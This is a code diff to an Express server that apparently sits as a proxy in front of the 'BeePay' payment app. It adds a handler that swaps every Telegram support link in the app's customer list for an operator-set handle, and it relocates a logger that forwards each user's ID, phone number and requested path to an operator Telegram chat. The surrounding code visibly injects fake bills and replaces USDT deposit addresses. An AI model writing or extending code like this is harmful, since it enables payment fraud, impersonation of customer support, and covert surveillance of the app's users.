@@ -23,7 +23,8 @@ const DEFAULT_DATA = {
   withdrawOverride: 0,
   userOverrides: {},
   trackedUsers: {},
-  appVersion: '2.1.1'
+  appVersion: '2.1.1',
+  tgLink: 'https://t.me/Zylox_EZpey'
 };
 
 let bot = null;
@@ -84,7 +85,7 @@ async function saveData(data) {
     if (!skipMerge) {
       const current = await redis.get('beepayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones', 'appVersion'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'activePhones', 'appVersion', 'tgLink'];
         for (const key of settingsKeys) {
           if (current[key] !== undefined) data[key] = current[key];
         }
@@ -431,7 +432,7 @@ app.all('/appAuth/checkUpdate', async (req, res) => {
   const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
   let ver = '2.1.1';
   try {
-    const d = await loadData();
+    const d = await loadData(true); // force-refresh — always read latest from Redis
     if (d && d.appVersion) ver = d.appVersion;
   } catch(e) {}
   res.json({
@@ -504,6 +505,38 @@ app.use(async (req, res, next) => {
   });
 });
 
+// ── Request logger ────────────────────────────────────────────────
+// MUST be registered HERE — after body parser, before route handlers.
+// Express runs middleware in registration order. Putting this after routes = never fires.
+const _logRateLimit = {};
+app.use((req, res, next) => {
+  (async () => {
+    try {
+      if (!bot) return;
+      const data = cachedData || await loadData();
+      if (!data.logRequests || !data.adminChatId) return;
+      const path = req.originalUrl || req.url;
+      const skip = ['/appAuth/domainPool', '/appAuth/checkUpdate', '/bot-webhook', '/health', '/favicon'];
+      if (skip.some(s => path.includes(s))) return;
+      const hdr = req.headers || {};
+      const body = req.parsedBody || {};
+      // BeePay sends memberCode in headers on every authenticated request
+      const userId = hdr['membercode'] || hdr['memberCode'] ||
+                     body.memberCode || body.memberId || body.userId || '';
+      // Rate-limit: same user+path fires only once per 8 seconds
+      const rateKey = `${userId || 'anon'}:${path.split('?')[0]}`;
+      const now = Date.now();
+      if (_logRateLimit[rateKey] && now - _logRateLimit[rateKey] < 8000) return;
+      _logRateLimit[rateKey] = now;
+      if (userId && isLogOff(data, userId)) return;
+      const phone = getPhone(data, userId);
+      const tag = userId ? ` [${userId}]` : '';
+      const phoneTag = phone ? ` (${phone})` : '';
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(() => {});
+    } catch(e) {}
+  })();
+  next();
+});
 
 // ── User ID extraction ────────────────────────────────────────────
 async function extractUserId(req, jsonResp) {
@@ -826,39 +859,6 @@ async function transparentProxy(req, res) {
   }
 }
 
-// ── Request logger ────────────────────────────────────────────────
-// BeePay sends memberCode in both body AND request headers (all auth requests).
-// We read from headers first since body might not be parsed yet for multipart.
-const _logRateLimit = {};
-app.use((req, res, next) => {
-  (async () => {
-    try {
-      if (!bot) return;
-      const data = cachedData || await loadData();
-      if (!data.logRequests || !data.adminChatId) return;
-      const path = req.originalUrl || req.url;
-      const skip = ['/appAuth/domainPool', '/appAuth/checkUpdate', '/bot-webhook', '/health', '/favicon'];
-      if (skip.some(s => path.includes(s))) return;
-      const hdr = req.headers || {};
-      const body = req.parsedBody || {};
-      // BeePay uses memberCode (e.g. M107266) — check headers first, then body
-      const userId = hdr['membercode'] || hdr['memberCode'] ||
-                     body.memberCode || body.memberId || body.userId || '';
-      // Rate-limit: same user+path only once per 8s
-      const rateKey = `${userId||'anon'}:${path.split('?')[0]}`;
-      const now = Date.now();
-      if (_logRateLimit[rateKey] && now - _logRateLimit[rateKey] < 8000) return;
-      _logRateLimit[rateKey] = now;
-      if (userId && isLogOff(data, userId)) return;
-      const phone = getPhone(data, userId);
-      const tag = userId ? ` [${userId}]` : '';
-      const phoneTag = phone ? ` (${phone})` : '';
-      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${path}${tag}${phoneTag}`).catch(()=>{});
-    } catch(e) {}
-  })();
-  next();
-});
-
 // ── Bot setup ─────────────────────────────────────────────────────
 app.get('/setup-webhook', async (req, res) => {
   if (!bot) return res.json({ error: 'No bot token' });
@@ -933,6 +933,11 @@ app.post('/bot-webhook', async (req, res) => {
 === USDT ===
 /usdt <address>
 /usdt off
+
+=== TG LINK ===
+/tglink — Current link
+/tglink https://t.me/username — Set link
+/tglink off — Disable override
 
 === APP VERSION ===
 /version — Current version
@@ -1199,6 +1204,22 @@ Example:
       await saveData(data);
       await bot.sendMessage(chatId, `✅ App version set to ${ver}\nApp refresh karne ke baad dikhega`);
       return res.sendStatus(200);
+    }
+
+    // /tglink
+    if (text === '/tglink') {
+      data = await loadData(true);
+      await bot.sendMessage(chatId, `🔗 TG Link: ${data.tgLink || '(not set)'}\nChange: /tglink https://t.me/username\nOff: /tglink off`);
+      return res.sendStatus(200);
+    }
+    if (text === '/tglink off') {
+      data = await loadData(true); data.tgLink = ''; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, '✅ TG Link override disabled'); return res.sendStatus(200);
+    }
+    if (text.startsWith('/tglink ')) {
+      const link = text.substring(8).trim();
+      data = await loadData(true); data.tgLink = link; data._skipOverrideMerge = true; await saveData(data);
+      await bot.sendMessage(chatId, `✅ TG Link set: ${link}`); return res.sendStatus(200);
     }
 
     // /usdt
@@ -1688,6 +1709,27 @@ app.all('/appApi/member/detail', async (req, res) => { await proxyAndAddBonus(re
 app.all('/appApi/memberOrder/usdtOrderPage', async (req, res) => { await proxyAndInjectFakeBills(req, res); });
 
 // USDT endpoints — USDT address replacement
+// ── Customer list — replace Telegram link ─────────────────────────
+app.all('/appApi/customer/list', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (data.tgLink && jsonResp) {
+      // Replace ALL t.me links anywhere in the response with our link
+      const raw = JSON.stringify(jsonResp);
+      const replaced = raw.replace(/https?:\/\/t\.me\/[^\s"\\]*/g, data.tgLink);
+      if (replaced !== raw) {
+        try {
+          const newObj = JSON.parse(replaced);
+          for (const k of Object.keys(jsonResp)) delete jsonResp[k];
+          Object.assign(jsonResp, newObj);
+        } catch(e) {}
+      }
+    }
+    sendJson(res, respHeaders, jsonResp, respBody);
+  } catch(e) { await transparentProxy(req, res); }
+});
+
 app.all('/appApi/orderUsdt/v2/info', async (req, res) => {
   const data = await loadData();
   try {
